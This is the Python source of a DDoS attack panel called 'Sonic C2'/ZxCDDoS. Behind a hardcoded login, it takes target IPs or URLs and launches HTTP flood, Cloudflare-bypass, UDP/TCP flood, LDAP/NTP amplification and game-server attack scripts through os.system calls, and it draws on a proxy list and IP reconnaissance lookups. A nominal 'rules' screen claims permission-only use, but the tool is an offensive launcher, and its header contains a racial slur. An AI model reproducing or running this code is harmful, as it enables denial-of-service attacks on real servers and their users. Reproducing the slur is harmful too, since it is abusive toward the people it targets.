##############################
# ZxCDDoS Made by zxcr9999   #
# COPY = NIGGER              #
##############################

import socket
import os
import requests
import random
import getpass
import time
import sys

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('proxies.txt').readlines()
bots = len(proxys)

def ascii_vro():
    clear()
    print(f'''
     / **/|        
     | == /        
      |  |         
      |  |         
      |  /         
       |/  







    ''')
    time.sleep(0.6)
    clear()
    print(f'''



     / **/|        
     | == /        
      |  |         
      |  |         
      |  /         
       |/  


    ''')
    time.sleep(0.6)
    clear()
    print(f'''







     / **/|        
     | == /        
      |  |                  

    ''')
    time.sleep(0.6)
    clear()
    print(f"""

     _.-^^---....,,--       
 _--                  --_  
<                        >)
|                         | 
 \._                   _./  
    ```--. . , ; .--'''       
          | |   |             
       .-=||  | |=-.   
       `-=#$%&%$#=-'   
          | ;  :|     
 _____.,-#%&$@%#&#~,._____
    """)
    time.sleep(0.8)
    clear()

def si():
    print('         \033[36m[ SONIC \033[36m] | \033[37m Welcome to SONIC PN! \033[36m| \033[37mOwner: the reroatzx \033[36m| \033[37mUpdate v1.1')
    print("")

def tools():
    clear()
    si()
    print(f'''
\033[36m                              ╔═══════════════╗
\033[36m                              ║\033[37m AMP's Games   \033[36m║
\033[36m               ╔══════════════╩════════╦══════╩══════════════╗
\033[36m               ║\033[37m   ovh-amp             \033[36m║   \033[37movh-amp           \033[36m║
\033[36m               ║\033[37m   minecraft           \033[36m║   \033[37mstd               \033[36m║
\033[36m               ║ \033[37m  samp                \033[36m║   \033[37mldap             \033[36m ║
\033[36m               ║ \033[37m  <empty>             \033[36m║   \033[37m<empty>           \033[36m║
\033[36m               ╚═══════════════════════╩═════════════════════╝
''')
    
def tools():
    clear()
    si()
    print(f'''
\033[36m                                ╔═══════════════╗
\033[36m                                ║     Tools     ║
\033[36m                ╔═══════════════╩══════╦════════╩═══════════════╗
\033[36m                ║  geoip               ║  reverse-dns           ║
\033[36m                ║  reverseip           ║  <empty>               ║  
\033[36m                ║  subnet-lookup       ║  <empty>               ║
\033[36m                ║  asn-lookup          ║  <empty>               ║
\033[36m                ║  dns-lookup          ║  <empty>               ║
\033[36m                ╚══════════════════════╩════════════════════════╝
''')

def rules():
    clear()
    si()
    print(f'''
\033[36m                                ╔═══════════════╗
\033[36m                                ║\033[3721     Rules       \033[36m║
\033[36m                ╔═══════════════╩═══════════════╩═══════════════╗
\033[36m                ║ \033[37211. Do not attack without someone's permission   \033[36m║
\033[36m                ║ \033[37212. Do not attack .gov/.gob/.edu/.mil domains    \033[36m║
\033[36m                ║ \033[37213. Do not spam attacks                          \033[36m║
\033[36m                ║ \033[37214. Only attack stress testing servers           \033[36m║
\033[36m                ║ \033[37215. Don't skid the panel                         \033[36m║
\033[36m                ║ \033[37216. Give a star to the github repository         \033[36m║
\033[36m                ║ \033[37217. The creator does not do any harm             \033[36m║
\033[36m                ╚═══════════════════════════════════════════════╝
''')

def ports():
    clear()
    si()
    print(f'''
\033[36m                                ╔═══════════════╗
\033[36m                                ║\033[37     Ports       \033[36m║
\033[36m                ╔═══════════════╩═══════════════╩═══════════════╗
\033[36m                ║\033[37 21 - SFTP       69   - TFTP      5060  - RIP    \033[36m║
\033[36m                ║\033[37 22 - SSH        80   - HTTP      30120 - FIVEM  \033[36m║
\033[36m                ║\033[37 23 - TELNET     443  - HTTPS                    \033[36m║   
\033[36m                ║\033[37 25 - SMTP       3074 - XBOX                     \033[36m║
\033[36m                ║\033[37 53 - DNS        5060 - PLAYSATION               \033[36m║
 \033[36m               ╚═══════════════════════════════════════════════╝
''')

def vip():
    clear()
    si()
    print(f'''
\033[36m                ╔═══════════════════════════════════════════════╗
\033[36m                ║\033[37                     stress                      \033[36m║
\033[36m                ║\033[37                   sonic-vip2                    \033[36m║
\033[36m                ║\033[37                   sonic-vip                     \033[36m║
\033[36m                ║\033[37                  Coming Soon!                   \033[36m║
\033[36m                ╚═══════════════════════════════════════════════╝
''')
    
def layer7():
    clear()
    si()
    print(f'''
\033[36m                              ╔═══════════════╗
\033[36m                              ║\033[37    Layer 7     \033[36m ║
\033[36m               ╔══════════════╩════════╦══════╩══════════════╗
\033[36m               ║   \033[37mgoat-bypass         \033[36m║   \033[37mcloudflare-uam    \033[36m║
\033[36m               ║   \033[37mhttp-fuzz           \033[36m║   \033[37mnormal-bypass     \033[36m║
\033[36m               ║   \033[37mhttp-dstat          \033[36m║   \033[37mcf-bypass         \033[36m║
\033[36m               ║   \033[37mautobypass          \033[36m║   \033[37mhttps-bypass      \033[36m║
\033[36m               ║   \033[37mhttp-rand           \033[36m║   \033[37m100up-bypass      \033[36m║
\033[36m               ║   \033[37mhttp-raw            \033[36m║   \033[37mhttp-flood        \033[36m║
\033[36m               ║   \033[37mhttp-overflow       \033[36m║   \033[37mhttp-get          \033[36m║
\033[36m               ╚═══════════════════════╩═════════════════════╝
''')

def layer4():
    clear()
    si()
    print(f'''
\033[36m                              ╔═══════════════╗
\033[36m                              ║    \033[37mLayer 4    \033[36m║
\033[36m               ╔══════════════╩════════╦══════╩══════════════╗
\033[36m               ║\033[37m   udp-god             \033[36m║   \033[37mldap-vro          \033[36m║
\033[36m               ║\033[37m   home-god            \033[36m║   \033[37movh-fuck          \033[36m║
\033[36m               ║ \033[37m  telnet-god          \033[36m║   \033[37m<empty>           \033[36m║
\033[36m               ║ \033[37m  haven-god           \033[36m║   \033[37m<empty>           \033[36m║
\033[36m               ╚═══════════════════════╩═════════════════════╝
''')

def amp_game():
    clear()
    si()
    print(f'''
\033[36m                              ╔═══════════════╗
\033[36m                              ║\033[37m AMP's Games   \033[36m║
\033[36m               ╔══════════════╩════════╦══════╩══════════════╗
\033[36m               ║\033[37m   ovh-amp             \033[36m║   \033[37movh-amp           \033[36m║
\033[36m               ║\033[37m   minecraft           \033[36m║   \033[37mstd               \033[36m║
\033[36m               ║ \033[37m  samp                \033[36m║   \033[37mldap             \033[36m ║
\033[36m               ║ \033[37m  <empty>             \033[36m║   \033[37m<empty>           \033[36m║
\033[36m               ╚═══════════════════════╩═════════════════════╝
''')


def menu():
    sys.stdout.write(f"         \x1b]2;SONIC C2 --> Stars: [{bots}] | Online Users: [1] | Methods: [29] | Bypass: [10] | Amps: [1]\x07")
    clear()
    print('\033[36m[ SONIC \033[36m] | \033[37m Welcome to SONIC C2! \033[36m| \033[37mOwner: the reroatzx \033[36m| \033[37mUpdate v1.1')
    print("")
    print("""
\033[36m                                ╔═╗ ╔═╗ ╔╗\033[37m╔ ╦ ╔═╗
\033[36m                                ╚═╗ ║ ║ ║║\033[37m║ ║ ║
\033[36m                                ╚═╝ ╚═╝ ╝╚\033[37m╝ ╩ ╚═╝
\033[36m                ╔══════════════════════════════════════════════╗
\033[36m                ║\033[37m          Welcome to Sonic C2 DDoS Panel     \033[36m ║
\033[36m                ║\033[37m - - - - - - Vip  DDoS Panel 2022- - - - - - -\033[36m║
\033[36m                ╚═════╦═════════════════════════════════╦══════╝
\033[36m                     ╔╩═════════════════════════════════╩╗
\033[36m                     ║\033[37m - - CONNECTION [ESTABHILISED] - - \033[36m║
\033[36m                    ╔╩═══════════════════════════════════╩╗
\033[36m                ╔═══╩═════════════════════════════════════╩════╗
\033[36m                ║\033[37m      Type help to see the all commands.     \033[36m ║
\033[36m                ╚══════════════════════════════════════════════╝
""")

def main():
    menu()
    while(True):
        cnc = input('''\033[36m╔══[\033[37msonic\033[36m@\033[37mroot\033[36m]
\033[36m╚════\033[37m➤\033[37m ''')
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7":
            layer7()
        elif cnc == "vip" or cnc == "Vip" or cnc == "VIP" or cnc == "viP":
            vip()
        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4":
            layer4()
        elif cnc == "amp/games" or cnc == "AMP/GAMES" or cnc == "amp/game" or cnc == "amps/game" or cnc == "amps/games" or cnc == "amp/games" or cnc == "AMP/GAME"or cnc == "amp"or cnc=="game":
            amp_game()
        elif cnc == "rule" or cnc == "RULES" or cnc == "rules" or cnc == "RULES" or cnc == "RULE34":
            rules()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls":
            main()
        elif cnc == "ports" or cnc == "port" or cnc == "PORTS" or cnc == "PORT":
            ports()
        elif cnc == "tools" or cnc == "tool" or cnc == "TOOLS" or cnc == "TOOL":
            tools()

        elif "normal-bypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node httpbypassv2.js {url} {time}')
            except IndexError:
                print('Usage: normal-bypass <url> <time>')
                print('Example: normal-bypass http://example.com 20')

        elif "stress" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                mode = cnc.split()[3]
                conn = cnc.split()[4]
                time = cnc.split()[5]
                out = cnc.split()[6]
                os.system(f'go run stress.go {ip} {port} {mode} {conn} {time} {out}')
            except IndexError:
                print('Usage: stress <ip> <port> <mode> <connection> <seconds> <timeout>')
                print('MODE: [1] TCP')
                print('      [2] UDP')
                print('      [3] HTTP')
                print('Example: stress 1.1.1.1 80 3 1250 60 5')

        elif "sonic-vip2" in cnc:
            try:
                os.system(f'python3 sonic-ddos.py')
            except IndexError:
                print('sonic-vip2')

        elif "sonic-vip" in cnc:
            try:
                os.system(f'python3 sonic-vip.py')
            except IndexError:
                print('sonic-vip')

        elif "samp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'python2 samp.py {ip} {port}')
            except IndexError:
                print('Usage: samp <ip> <port>')
                print('Example: samp 1.1.1.1 7777')

        elif "ldap" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./ldap {ip} {port} {thread} -1 {time}')
            except IndexError:
                print('Usage: ldap <ip> <port> <threads> <time>')
                print('Example: ldap 1.1.1.1 80 650 60')

        elif "minecraft" in cnc:
            try:
                ip = cnc.split()[1]
                throttle = cnc.split()[2]
                threads = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./MINECRAFT-SLAM {ip} {threads} {time}')
            except IndexError:
                print('Usage: minecraft <ip> <throttle> <threads> <time>')
                print('Example: minecraft 1.1.1.1 5000 500 60')

        elif "ovh-amp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'sudo ./OVH-AMP {ip} {port}')
            except IndexError:
                print(f'Usage: ovhamp <ip> <port>')
                print(f'Example: ovhamp 1.1.1.1 34264')
                
        elif "ntp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                throttle = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./ntp {ip} {port} ntp.txt {throttle} {time}')
            except IndexError:
                print('Usage: ntp <ip> <port> <throttle> <time>')
                print('Example: ntp 1.1.1.1 22 250 60')

        elif "cf-bypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                threads = cnc.split()[3]
                os.system(f'node cf.js {url} {time} {threads}')
            except IndexError:
                print('Usage: cf-bypass <url> <time> <threads>')
                print('Example: cf-bypass http://example-cloud.com 20 15')

        elif "https-bypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node https.js {url} {time} proxies.txt')
            except IndexError:
                print('Usage: https-bypass <url> <time>')
                print('Example: https-bypass http://example.org 20')

        elif "http-raw" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                method = cnc.split()[3]
                ascii_vro()
                os.system(f'node HTTP-RAW.js {url} {time} {method}')
            except IndexError:
                print('Usage: https-raw <url> <time> <GET/POST/HEAD>')
                print('Example: http-raw http://example.com 20 POST')

        elif "cloudflare-uam" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                cpt = cnc.split()[3]
                os.system(f'node uambypass.js {url} {time} {cpt} proxies.txt ')
            except IndexError:
                print('Usage: cloudflare-uam <url> <time> <req_per_ip>')
                print('Example: cloudflare-uam http://example-uam.com 20 250')

        elif "http-overflow" in cnc:
            try:
                ip = cnc.split()[1]
                time = cnc.split()[2]
                threads = cnc.split()[3]
                os.system(f'./OVERFLOW {ip} {time} {threads}')
            except IndexError:
                print('Usage: http-overflow <ip> <time> <threads>')
                print('Example: http-overflow 77.233.1XX.XX 30 15')

        elif "http-get" in cnc:
            try:
                url = cnc.split()[1]
                idk = cnc.split()[2]
                idk1 = cnc.split()[3]
                idk2 = cnc.split()[4]
                os.system(f'perl httpget {url} {idk} {idk1} {idk2}')
            except IndexError:
                print('Usage: http-get <url> <10000> <50> <100>')
                print('Example: http-get http://example.com 10000 50 100')

        elif "http-flood" in cnc:
            try:
                url = cnc.split()[1]
                threads = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./httpflood {url} {threads} {method} {time} header.txt')
            except IndexError:
                print('Usage: http-flood <url> <threads> <get/post> <time>')
                print('Example: http-flood http://example.com 15 post 30')

        elif "100up-bypass" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4]
                connections = cnc.split()[5]
                os.system(f'./100UP-TCP {method} {ip} {port} {time} {connections}')
            except IndexError:
                print('Usage: 100up-bypass <GET/POST/HEAD> <ip> <port> <time> <connections')
                print('Example: 100up-bypass GET 77.233.1XX.XX 80 20 80000')

        elif "http-dstat" in cnc:
            try:
                url = cnc.split()[1]
                connections = cnc.split()[2]
                rps = cnc.split()[3]
                os.system(f'perl dstat.pl {url} {connections} {rps} 13.87')
            except IndexError:
                print('Usage: http-dstat <url> <connections> <rps>')
                print('Example: http-dstat http://example.org 50000 50000')

        elif "goat-bypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                rps = cnc.split()[3]
                os.system(f'node method.js {url} {time} request {rps}')
            except IndexError:
                print('Usage: goat-bypass <url> <time> <requests_per_second>')
                print('Example: goat-bypass http://example-protected-org 30 450')

        elif "geoip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/geoip/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: geoip <ip>')
                print('Example: geoip 1.1.1.1')

        elif "reverseip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reverseiplookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverseip <ip>')
                print('Example: reverseip 1.1.1.1')

        elif "subnet-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/subnetcalc/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: subnet-lookup <cdr/ip + netmask>')
                print('Example: subnet-lookup 192.168.1.0/24')

        elif "asn-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/aslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: asn-lookup <ip/asn>')
                print('Example: asn-lookup AS15169')

        elif "dns-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/dnslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: dns-lookup <dns>')
                print('Example: dns-lookup google.com')

        elif "reverse-dns" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reversedns/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverse-dns <ip/domain>')
                print('Example: reverse-dns 8.8.8.8')                

        elif "http-fuzz" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node httpfuzz.js {url} proxies.txt {time} POST')
            except IndexError:
                print(f'Usage: http-fuzz <url> <time>')
                print("Example: http-fuzz http://sexo.org 30")

        elif "autobypass" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'./AUTOBYPASS TCP {ip} {port} {time}')
            except IndexError:
                print('Usage: autobypass <ip> <port> <time>')
                print('Example: autobypass 188.40.1XX.XX 80 30')

        elif "http-rand" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAND.js {url} {time}')
            except IndexError:
                print("Usage: http-rand <url> <time>")
                print("Example: http-rand http://si.com 10")

        elif 'ldap-vro' in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                threads = cnc.split()[3]
                pps = cnc.split()[4]
                time = cnc.split()[5]
                os.system(f'sudo ./ldapv2 {ip} {port} ldaplist.txt {threads} {pps} {time}')
            except IndexError:
                print(f'Usage: ldap-vro <ip> <port> <threads> <pps> <time>')
                print(f'Example: ldap-vro 1.1.1.1 8739 15 1024 50')

        elif "udp-god" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                threads = cnc.split()[3]
                throttle = cnc.split()[4]
                time = cnc.split()[5]
                os.system(f'sudo ./udp {ip} {port} {threads} {throttle} {time}')
            except IndexError:
                print(f'Usage: udp-god <ip> <port> <threads> <throttle> <time>')
                print(f'Example: udp-god 1.1.1.1 80 30 40000 30')

        elif "haven-god" in cnc:
            try:
                ip = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'sudo ./haven -d {ip} -t {time} -z 130')
            except IndexError:
                print('Usage: haven-god <ip> <time>')
                print('Example: haven-god 192.168.0.1 30')

        elif "telnet-god" in cnc:
            try:
                ip = cnc.split()[1]
                threads = cnc.split()[2]
                pps = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'sudo ./telnet {ip} {threads} {pps} {time}')
            except IndexError:
                print(f'Usage: telnet-god <ip> <threads> <pps> <time>')
                print('Example: telnet-god 192.168.0.1 30 80000 50')

        elif "home-god" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                psize = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'perl home.pl {ip} {port} {psize} {time}')
            except IndexError:
                print(f'Usage: home-god <ip> <port> <packet_size> <time>')
                print(f'Example: home-god 1.1.1.1 80 1024 50')

        elif "ovh-fuck" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'sudo ./MertOVH {ip} {port}')
            except IndexError:
                print('Usage: game-crash <ip> <port>')
                print('Example: game-crash 192.168.0.1 22')

        elif "cloudflare-lag" in cnc:
            print('Method "CLOUDFLARE-LAG" not enabled')

        elif "help" in cnc:
            print(f'''
\033[36m                                ═════════╦════════════════╦══════════
\033[36m                        ╔════════════════╩════════════════╩════════════════╗
\033[36m             ╔══════════╩══════════╦══╦═════════════════════╦═══╦══════════╩══════════╗
\033[36m             ║  \033[37mlayer7            \033[36m ║\033[37m L\033[36m║  \033[37mgame               \033[36m║\033[37m L \033[36m║  \033[37mtools              \033[36m║
\033[36m             ║  \033[37mlayer4            \033[36m ║  \033[36m║  \033[37mrules              \033[36m║   \033[36m║  \033[37mcls                \033[36m║
\033[36m             ║  \033[37mamp               \033[36m ║  \033[36m║  \033[37mports              \033[36m║   \033[36m║ \033[37m vip                \033[36m║
\033[36m             ╚═════════════════════╩══╩═════════════════════╩═══╩═════════════════════╝

            ''')
        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass


def login():
    clear()
    user = "1"
    passwd = "1"
    username = input("</> Username: ")
    password = getpass.getpass(prompt='</> Password: ')
    if username != user or password != passwd:
        print("")
        print("</> Invalid credentials! Abandoning...")
        sys.exit(1)
    elif username == user and password == passwd:
        print("</> Welcome to SONIC C2!")
        time.sleep(0.3)
        ascii_vro()
        main()

login()
